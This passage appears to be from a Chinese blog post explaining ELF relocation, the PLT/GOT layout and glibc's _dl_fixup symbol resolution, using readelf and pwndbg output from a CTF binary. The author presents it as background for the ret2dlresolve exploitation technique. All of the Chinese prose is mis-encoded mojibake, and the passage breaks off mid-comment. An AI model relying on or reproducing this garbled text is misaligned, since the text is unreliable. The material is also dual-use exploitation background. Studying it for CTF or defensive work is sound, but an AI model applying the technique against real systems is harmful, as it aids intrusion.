<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/CTF-All-In-One/src/writeup/6.1.3_pwn_xdctf2015_pwn200# readelf -r <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.dyn&#x27;</span> at offset 0x294 contains 1 entry:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">08049ffc  00000106 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.plt&#x27;</span> at offset 0x29c contains 2 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">0804a00c  00000207 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a010  00000307 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0</span><br></pre></td></tr></table></figure>

<p>æ¯ä¸€ä¸ªé‡å®šä½è¡¨é¡¹éƒ½å¯¹åº”ä¸€ä¸ª<code>Elf32_Rel</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset;       <span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word    r_info;         <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>

<p>r_offsetæ˜¯ç¬¦å·gotè¡¨é¡¹çš„è™šæ‹Ÿåœ°å€</p>
<p>r_infoæ˜¯ç¬¦å·çš„é‡å®šä½ç±»å‹å’Œç¬¦å·ä¸‹æ ‡</p>
<p>â€‹	é‡å®šä½ç±»å‹æœ€å¸¸è§å…¨å±€å˜é‡çš„R_386_GLOB_DATå’Œå…¨å±€å‡½æ•°çš„R_386_JUMP_SLOT</p>
<p>â€‹	ç¬¦å·ä¸‹æ ‡ç´¢å¼•.dynsymèŠ‚</p>
<p>æ¯”å¦‚<code>write</code>çš„ç´¢å¼•æ˜¯3,</p>
<p><code>libc_start_main</code>çš„ç´¢å¼•æ˜¯2</p>
<p><code>__gmon_start__</code>çš„ç´¢å¼•æ˜¯1</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/CTF-All-In-One/src/writeup/<span class="number">6.1</span><span class="number">.3</span>_pwn_xdctf2015_pwn200<span class="meta"># readelf -s test</span></span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.dynsym&#x27;</span> contains <span class="number">5</span> entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     <span class="number">1</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">     <span class="number">2</span>: <span class="number">00000000</span>     <span class="number">0</span> FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2<span class="number">.0</span> (<span class="number">2</span>)</span><br><span class="line">     <span class="number">3</span>: <span class="number">00000000</span>     <span class="number">0</span> FUNC    GLOBAL DEFAULT  UND write@GLIBC_2<span class="number">.0</span> (<span class="number">2</span>)</span><br><span class="line">     <span class="number">4</span>: <span class="number">080484</span>ec     <span class="number">4</span> OBJECT  GLOBAL DEFAULT   <span class="number">16</span> _IO_stdin_used</span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.symtab&#x27;</span> contains <span class="number">70</span> entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">		...</span><br><span class="line">    <span class="number">32</span>: <span class="number">00000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS crtstuff.c</span><br><span class="line">    <span class="number">33</span>: <span class="number">08048370</span>     <span class="number">0</span> FUNC    LOCAL  DEFAULT   <span class="number">14</span> deregister_tm_clones</span><br><span class="line">    <span class="number">34</span>: <span class="number">080483b</span>0     <span class="number">0</span> FUNC    LOCAL  DEFAULT   <span class="number">14</span> register_tm_clones</span><br><span class="line">    <span class="number">35</span>: <span class="number">080483f</span>0     <span class="number">0</span> FUNC    LOCAL  DEFAULT   <span class="number">14</span> __do_global_dtors_aux</span><br><span class="line">    <span class="number">36</span>: <span class="number">0804</span>a01c     <span class="number">1</span> OBJECT  LOCAL  DEFAULT   <span class="number">25</span> completed<span class="number">.7283</span></span><br><span class="line">    <span class="number">37</span>: <span class="number">08049f</span>10     <span class="number">0</span> OBJECT  LOCAL  DEFAULT   <span class="number">20</span> __do_global_dtors_aux_fin</span><br><span class="line">    <span class="number">38</span>: <span class="number">08048420</span>     <span class="number">0</span> FUNC    LOCAL  DEFAULT   <span class="number">14</span> frame_dummy</span><br><span class="line">    <span class="number">39</span>: <span class="number">08049f</span>0c     <span class="number">0</span> OBJECT  LOCAL  DEFAULT   <span class="number">19</span> __frame_dummy_init_array_</span><br><span class="line">    <span class="number">40</span>: <span class="number">00000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS test.c</span><br><span class="line">	...</span><br><span class="line">    <span class="number">66</span>: <span class="number">08048426</span>    <span class="number">64</span> FUNC    GLOBAL DEFAULT   <span class="number">14</span> main</span><br><span class="line">    <span class="number">67</span>: <span class="number">08048466</span>     <span class="number">0</span> FUNC    GLOBAL HIDDEN    <span class="number">14</span> __x86.get_pc_thunk.ax</span><br><span class="line">    <span class="number">68</span>: <span class="number">0804</span>a01c     <span class="number">0</span> OBJECT  GLOBAL HIDDEN    <span class="number">24</span> __TMC_END__</span><br><span class="line">    <span class="number">69</span>: <span class="number">080482</span>ac     <span class="number">0</span> FUNC    GLOBAL DEFAULT   <span class="number">11</span> _init</span><br></pre></td></tr></table></figure>

<p>readelf -sä¼šè¯»å–ä¸¤ä¸ªè¡¨,ä¸€ä¸ªæ˜¯æœ¬åœ°ç¬¦å·è¡¨symtab,ä¸€ä¸ªæ˜¯é“¾æ¥ç¬¦å·è¡¨.dynsym</p>
<p>è¿™ä¸ªsymtabå¯ä»¥stripæ‰,ä¸å½±å“ç¨‹åºæ‰§è¡Œ</p>
<p>è€Œå®é™…ä¸Šè¿™ä¸¤ä¸ªç¬¦å·è¡¨çš„è¡¨é¡¹ä¸­å¹¶æ²¡æœ‰Nameæ•°ç»„,st_nameæ˜¯ä¸€ä¸ªç´¢å¼•,ç´¢å¼•å­—ç¬¦ä¸²è¡¨.strtab</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    st_name;        /* Symbol name (string tbl index) */</span><br><span class="line">  Elf32_Addr    st_value;       /* Symbol value */</span><br><span class="line">  Elf32_Word    st_size;        /* Symbol size */</span><br><span class="line">  unsigned char st_info;        /* Symbol type and binding */</span><br><span class="line">  unsigned char st_other;       /* Symbol visibility */</span><br><span class="line">  Elf32_Section st_shndx;       /* Section index */</span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1C7Ch: 00 63 72 74 73 74 75 66 66 2E 63 00 64 65 72 65  .crtstuff.c.dere </span><br><span class="line">1C8Ch: 67 69 73 74 65 72 5F 74 6D 5F 63 6C 6F 6E 65 73  gister_tm_clones </span><br><span class="line">1C9Ch: 00 5F 5F 64 6F 5F 67 6C 6F 62 61 6C 5F 64 74 6F  .__do_global_dto </span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>æ¯”å¦‚crtstuff.cçš„ç¬¦å·è¡¨é¡¹Elf32_Symä¸­,st_name&#x3D;1,å¯¹åº”0x1c7c+1</p>
<p>æ¯”å¦‚deregister_tm_clonesçš„ç¬¦å·è¡¨é¡¹Elf32_Symä¸­,st_name&#x3D;c,å¯¹åº”0x1c7c+c</p>
<p>è¿™é‡Œ0x1c7cæ˜¯.strtabèŠ‚åœ¨æ–‡ä»¶ä¸­çš„åç§»é‡,å¯ä»¥ä½¿ç”¨readelf -SæŸ¥çœ‹å¯¹åº”èŠ‚åŒº</p>
</blockquote>
<h4 id="GOT-PLT-1-link-map-ld"><a href="#GOT-PLT-1-link-map-ld" class="headerlink" title=".GOT.PLT[1]&#x3D;link_map @ ld"></a>.GOT.PLT[1]&#x3D;link_map @ ld</h4><p>.GOT.PLT[1]å’Œ.GOT.PLT[2]åœ¨ç¼–è¯‘é“¾æ¥æ—¶æ— æ³•å†³å®šæ˜¯å•¥ï¼Œåªæœ‰åœ¨è¿è¡Œæ—¶æ‰ä¼šçŸ¥é“æ˜¯ä»€ä¹ˆ</p>
<p>.GOT.PLT[1]ç”¨äºå­˜æ”¾<strong>ä¸»æ¨¡å—çš„</strong>link_mapæ•°æ®ç»“æ„çš„åœ°å€</p>
<p>æ¯ä¸ªæ¨¡å—(ä¸»æ¨¡å—ä»¥åŠæ‰€æœ‰åŠ è½½çš„åŠ¨æ€åº“)éƒ½å„è‡ªæœ‰ä¸€ä¸ªlink_map</p>
<p>è¿™ä¸ªlink_mapä¿å­˜äº†å¯¹åº”æ¨¡å—çš„è¯¸å¤šä¿¡æ¯,æ¯”å¦‚å„ä¸ªèŠ‚åŒºçš„åœ°å€,elfå¤´çš„åœ°å€,æ¨¡å—åç­‰</p>
<h4 id="GOT-PLT-2-dl-runtime-resolve-ld"><a href="#GOT-PLT-2-dl-runtime-resolve-ld" class="headerlink" title=".GOT.PLT[2]&#x3D;dl_runtime_resolve @ ld"></a>.GOT.PLT[2]&#x3D;dl_runtime_resolve @ ld</h4><p>å­˜æ”¾dl_runtime_resolveçš„åœ°å€</p>
<h4 id="GOT-PLT-3"><a href="#GOT-PLT-3" class="headerlink" title=".GOT.PLT[3+]"></a>.GOT.PLT[3+]</h4><p>ç¬¬å››é¡¹åŠä¹‹å,è¯¥è¡¨ç”¨äºä¿å­˜å‡½æ•°çš„è™šæ‹Ÿåœ°å€</p>
<h3 id="ç–‘é—®"><a href="#ç–‘é—®" class="headerlink" title="ç–‘é—®"></a>ç–‘é—®</h3><p>æ¯ä¸ªå‡½æ•°çš„pltè¡¨éƒ½æœ‰ä¸‰é¡¹</p>
<p>jmp</p>
<p>push</p>
<p>jmp</p>
<p>è¿™é‡Œç¬¬ä¸€ä¸ªjmpè°ƒè¯•è§‚å¯Ÿæ˜¯åˆ°pushè¿™è¡Œ</p>
<p>ç¬¬äºŒä¸ªjmpæ˜¯åˆ°dl_runtime_resolveå‡½æ•°ä¸­</p>
<p>é‚£ä¹ˆä¸­é—´pushäº†ä»€ä¹ˆå‘¢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//____libc_start_main</span><br><span class="line">.plt:080482E0 FF 25 0C A0 04 08                             jmp     ds:off_804A00C</span><br><span class="line">.plt:080482E6 68 00 00 00 00                                push    0</span><br><span class="line">.plt:080482EB E9 E0 FF FF FF                                jmp     sub_80482D0</span><br><span class="line"></span><br><span class="line">//write</span><br><span class="line">.plt:080482F0 FF 25 10 A0 04 08                             jmp     ds:off_804A010</span><br><span class="line">.plt:080482F6 68 08 00 00 00                                push    8</span><br><span class="line">.plt:080482FB E9 D0 FF FF FF                                jmp     sub_80482D0</span><br></pre></td></tr></table></figure>

<p>ç¬¦å·åˆåˆ°åº•æ˜¯å¦‚ä½•è§£æå¹¶ä¸”å›å¡«åˆ°GOTè¡¨çš„å‘¢?</p>
<p>ä¸ºäº†è§£å†³è¿™äº›é—®é¢˜,ä»¥åŠå­¦ä¹ ret2dlresolveçš„åŸç†,</p>
<p>ä¸‹é¢æˆ‘ä»¬é˜…è¯»<code>_dl_fixup</code>çš„æºç å¯»æ‰¾ç­”æ¡ˆ</p>
<h2 id="dl-fixup"><a href="#dl-fixup" class="headerlink" title="_dl_fixup"></a>_dl_fixup</h2><p>ä»¥writeä¸ºä¾‹ï¼Œè§‚å¯Ÿè¯¥ç¬¦å·æ˜¯å¦‚ä½•è§£æçš„</p>
<p>è§£æç¬¦å·å‘ç”Ÿåœ¨<code>_dl_fixup</code>å‡½æ•°ä¸­</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (<span class="keyword">struct</span> link_map *l, ElfW(Word) reloc_arg)</span><br></pre></td></tr></table></figure>

<p>è¯¥å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œå…¶ä¸­<code>link_map *l</code>å‚æ•°å°±æ˜¯<code>.got.plt[1]</code>,</p>
<p>å‚æ•°reloc_argæ˜¯ç›®æ ‡å‡½æ•°åœ¨.rel.pltä¸­çš„åç§»é‡</p>
<p>reloc_argåœ¨write@pltä¸­è¢«å‹å…¥æ ˆä¸­</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x80483a0</span> &lt;write@plt&gt;:       jmp    DWORD PTR ds:<span class="number">0x80498d4</span></span><br><span class="line"><span class="number">0x80483a6</span> &lt;write@plt+<span class="number">6</span>&gt;:     push   <span class="number">0x20</span></span><br><span class="line"><span class="number">0x80483ab</span> &lt;write@plt+<span class="number">11</span>&gt;:    jmp    <span class="number">0x8048350</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åè·³è½¬åˆ°<code>plt[0]=0x8048350</code>ï¼Œè¿™æ˜¯<code>_dl_runtime_resolve</code>çš„å¯¼ç«ç´¢ï¼Œåœ¨è¿™é‡Œé¦–å…ˆå°†<code>link_map *l</code>å‹å…¥æ ˆä¸­,ç„¶åè·³è½¬_<code>dl_runtime_resolve</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â–º <span class="number">0x8048350</span>                              push   dword ptr [<span class="number">0x80498bc</span>]</span><br><span class="line">  <span class="number">0x8048356</span>                              jmp    dword ptr [<span class="number">0x80498c0</span>]       &lt;_dl_runtime_resolve&gt;</span><br></pre></td></tr></table></figure>

<p>åœ¨<code>_dl_runtime_resolve</code>ä¸­,è¿™ä¸¤ä¸ªå‚æ•°åˆæ”¹ç”¨<code>eax(link_map *l)</code>å’Œ<code>edx(reloc_arg)</code>ä¼ é€’,ç¨å¾®è¿èƒŒäº†x86è°ƒç”¨çº¦å®š,ä½†æ˜¯é—®é¢˜ä¸å¤§</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_dl_runtime_resolve:</span><br><span class="line">	cfi_adjust_cfa_offset (<span class="number">8</span>)</span><br><span class="line">	_CET_ENDBR</span><br><span class="line">	pushl %eax		# Preserve registers otherwise clobbered.</span><br><span class="line">	cfi_adjust_cfa_offset (<span class="number">4</span>)</span><br><span class="line">	pushl %ecx</span><br><span class="line">	<span class="title function_">cfi_adjust_cfa_offset</span> <span class="params">(<span class="number">4</span>)</span></span><br><span class="line">	pushl %edx</span><br><span class="line">	<span class="title function_">cfi_adjust_cfa_offset</span> <span class="params">(<span class="number">4</span>)</span></span><br><span class="line">	movl 16<span class="params">(%esp)</span>, %edx	# Copy args pushed by PLT in <span class="keyword">register</span>.  Note</span><br><span class="line">	movl 12<span class="params">(%esp)</span>, %eax	<span class="meta"># that `fixup<span class="string">&#x27; takes its parameters in regs.</span></span></span><br><span class="line"><span class="string"><span class="meta">	call _dl_fixup		# Call resolver.</span></span></span><br></pre></td></tr></table></figure>



<p><code>_dl_runtime_resolve</code>å®é™…ä¸Šåªæ˜¯ä¸€ä¸ªåŒ…è£…å‡½æ•°,å®é™…å·¥ä½œæ˜¯<code>_dl_fixup</code>å®Œæˆçš„</p>
<p><code>_dl_fixup</code>å¹²äº†å•¥å‘¢?</p>
<p><code>_dl_fixup</code>çŸ¥é“ä¸¤ä»¶äº‹,</p>
<p>ä¸€ä¸ªæ˜¯ä¸»ç¨‹åºæ¨¡å—çš„<code>link_map</code>,è¿™ç©æ„å„¿ä¿å­˜äº†å¾ˆå¤šä¿¡æ¯,åŒ…æ‹¬å®ƒå±äºå“ªä¸ªæ¨¡å—,è¯¥æ¨¡å—çš„elfä¿¡æ¯ç­‰ç­‰</p>
<p>ä¸€ä¸ªè¿›ç¨‹æ‰€æœ‰æ¨¡å—çš„<code>link_map</code>ä»¥åŒå‘é“¾è¡¨è¿æ¥</p>
<blockquote>
<p>æ¯ä¸ªæ¨¡å—(ä¸»ç¨‹åºå’Œæ¯ä¸ªsoåº“)å„è‡ªæœ‰ä¸€ä¸ªlink_map</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/s l.l_name</span><br><span class="line">$<span class="number">8</span> = <span class="number">0xf7ffdd2c</span> <span class="string">&quot;&quot;</span></span><br><span class="line">pwndbg&gt; p/s l.l_next.l_name</span><br><span class="line">$<span class="number">9</span> = <span class="number">0xf7fc828c</span> <span class="string">&quot;linux-gate.so.1&quot;</span></span><br><span class="line">pwndbg&gt; p/s l.l_next.l_next.l_name</span><br><span class="line">$<span class="number">10</span> = <span class="number">0xf7fc2390</span> <span class="string">&quot;/home/glibc32/lib/libc.so.6&quot;</span></span><br><span class="line">pwndbg&gt; p/s l.l_next.l_next.l_next.l_name</span><br><span class="line">$<span class="number">11</span> = <span class="number">0x8046174</span> <span class="string">&quot;/home/glibc32/lib/ld-linux.so.2&quot;</span></span><br><span class="line">pwndbg&gt; p/s l.l_next.l_next.l_next.l_next.l_name</span><br><span class="line">Cannot access memory at address <span class="number">0x4</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>å¦ä¸€ä¸ªå°±æ˜¯reloc_arg,ä¹Ÿå°±æ˜¯ä»–è¦è§£æçš„å‡½æ•°ç¬¦å·,åœ¨.rel.pltèŠ‚åŒºä¸­çš„åç§»</p>
<p>æ˜¾ç„¶æŠ›å¼€åŸºåœ°å€è°ˆåç§»é‡æ˜¯æ²¡æœ‰æ„ä¹‰çš„,å› æ­¤ä¸‹é¢è¦åšçš„ç¬¬ä¸€ä»¶äº‹æ˜¯æ‰¾åˆ°.rel.pltçš„åŸºåœ°å€</p>
<p>æ€ä¹ˆæ‰¾å‘¢?</p>
<p>å¤§ä½“æ­¥éª¤å¦‚ä¸‹ä¼ªä»£ç </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup(<span class="keyword">struct</span> link_map *l,ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 1.æ‰¾åˆ°dynamicèŠ‚,1-&gt;1l_infoå°±æ˜¯dynamicèŠ‚,</span></span><br><span class="line">    <span class="comment">//ä»dynamicèŠ‚ä¸­æ‰¾åˆ°.rel.pltèŠ‚è®°ä¸ºreloc</span></span><br><span class="line">    <span class="comment">//ä»dynamicèŠ‚ä¸­æ‰¾åˆ°ç¬¦å·è¡¨symtab,</span></span><br><span class="line">    <span class="comment">//ä»dynamicèŠ‚ä¸­æ‰¾åˆ°å­—ç¬¦ä¸²è¡¨strtab</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="comment">// 2.ä½¿ç”¨reloc_argé…åˆrelocè¡¨æ‰¾åˆ°è¯¥è¡¨ä¸­çš„å…·ä½“é¡¹ç›®Elf32_Rel</span></span><br><span class="line">    <span class="comment">//        typedef struct&#123;</span></span><br><span class="line">    <span class="comment">//            Elf32_Addr  r_offset;       //ç¬¦å·è¦å¡«å……çš„gotè¡¨é¡¹çš„è™šæ‹Ÿåœ°å€</span></span><br><span class="line">    <span class="comment">//            Elf32_Word  r_info;         //ç¬¦å·åœ¨ç¬¦å·è¡¨ä¸­çš„ä¸‹æ ‡</span></span><br><span class="line">    <span class="comment">//        &#125; Elf32_Rel;</span></span><br><span class="line">	<span class="type">const</span> PLTREL *<span class="type">const</span> reloc = (<span class="type">const</span> <span class="type">void</span> *)(D_PTR(l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="comment">// 3.æ‰¾åˆ°ç¬¦å·è¡¨å¯¹åº”è¡¨é¡¹</span></span><br><span class="line">    <span class="comment">//        typedef struct &#123;</span></span><br><span class="line">    <span class="comment">//            Elf32_Word	st_name;	//ç¬¦å·åå­—ç¬¦ä¸²åœ¨å­—ç¬¦ä¸²è¡¨ä¸­çš„åç§»</span></span><br><span class="line">    <span class="comment">//            Elf32_Addr	st_value;	//ç¬¦å·åœ¨å…¶æ‰€åœ¨æ¨¡å—ä¸­çš„åç§»é‡</span></span><br><span class="line">    <span class="comment">//            Elf32_Word	st_size;</span></span><br><span class="line">    <span class="comment">//            unsigned char	st_info;</span></span><br><span class="line">    <span class="comment">//            unsigned char	st_other;</span></span><br><span class="line">    <span class="comment">//            Elf32_Half	st_shndx;</span></span><br><span class="line">    <span class="comment">//        &#125; Elf32_Sym;</span></span><br><span class="line">	<span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    </span><br><span class="line">	<span class="comment">// 4.è§£æç¬¦å·</span></span><br><span class="line">    <span class="comment">//ä»strtabåç§»Elf32_Sym.st_nameå¤„æ‰¾åˆ°ç¬¦å·å,</span></span><br><span class="line">    <span class="comment">//ä»é“¾è¡¨ç›¸æ¥çš„å„ä¸ªæ¨¡å—çš„link_mapå…¥æ‰‹,éå†å„ä¸ªæ¨¡å—,å¯»æ‰¾è¯¥ç¬¦å·å,å¦‚æœæ‰¾åˆ°,resultè¿”å›å¯¹åº”æ¨¡å—çš„link_map</span></span><br><span class="line">    <span class="comment">//åŒæ—¶symåºŸç‰©åˆ©ç”¨,ä»å¯¹åº”æ¨¡å—çš„ç¬¦å·è¡¨ä¸­æŠ„äº†åŒåçš„ç¬¦å·è¿‡æ¥,ä½†æ˜¯è¿™ä¸ªç¬¦å·æ˜¯æœ‰è™šæ‹Ÿåœ°å€çš„</span></span><br><span class="line">	result = _dl_lookup_symbol_x (strtab + sym -&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">// resultä¸­ä¿å­˜ç€ç›®æ ‡æ¨¡å—çš„åŸºåœ°å€,åŠ ä¸Šç›®æ ‡ç¬¦å·çš„åç§»é‡,å¾—åˆ°è¯¥ç¬¦å·çº¯çº¯çš„è™šæ‹Ÿåœ°å€,æ”¾åˆ°valueé‡Œ</span></span><br><span class="line">    <span class="comment">// è¿™é‡ŒDL_FIXUP_MAKE_VALUE(map,addr) = addr,çº¯çº¯å¼±æ™º</span></span><br><span class="line">	value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS(result) + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 5.å›å†™GOTè¡¨</span></span><br><span class="line">    <span class="comment">//æœ€åæŠŠvalueå†™å…¥ç›¸åº”çš„GOTè¡¨æ¡ç›®ä¸­,rel_addrå°±æ˜¯GOTåœ°å€</span></span><br><span class="line">	<span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åœ¨å›¾ä¸Šæ„æ€æ„æ€</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240819193758449.png" alt="image-20240819193758449"></p>
<p>ä¸‹é¢è¯¦ç»†è¯´æ˜æ¯ä¸€æ­¥</p>
<h3 id="1-ç”±ä¸»æ¨¡å—link-mapæ‰¾dynamicèŠ‚"><a href="#1-ç”±ä¸»æ¨¡å—link-mapæ‰¾dynamicèŠ‚" class="headerlink" title="1.ç”±ä¸»æ¨¡å—link_mapæ‰¾dynamicèŠ‚"></a>1.ç”±ä¸»æ¨¡å—link_mapæ‰¾dynamicèŠ‚</h3><p>è¿™ä¸ª<code>link_map</code>ä¸­æœ‰ä¸€ä¸ªæˆå‘˜å«<code>l_info</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">	...</span><br><span class="line">    <span class="comment">/* Indexed pointers to dynamic section.		dynamicèŠ‚çš„ç´¢å¼•æŒ‡é’ˆ</span></span><br><span class="line"><span class="comment">       [0,DT_NUM) are indexed by the processor-independent tags.</span></span><br><span class="line"><span class="comment">       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VERSIONTAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by</span></span><br><span class="line"><span class="comment">       DT_EXTRATAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VALTAGIDX(tagvalue) and</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,</span></span><br><span class="line"><span class="comment">	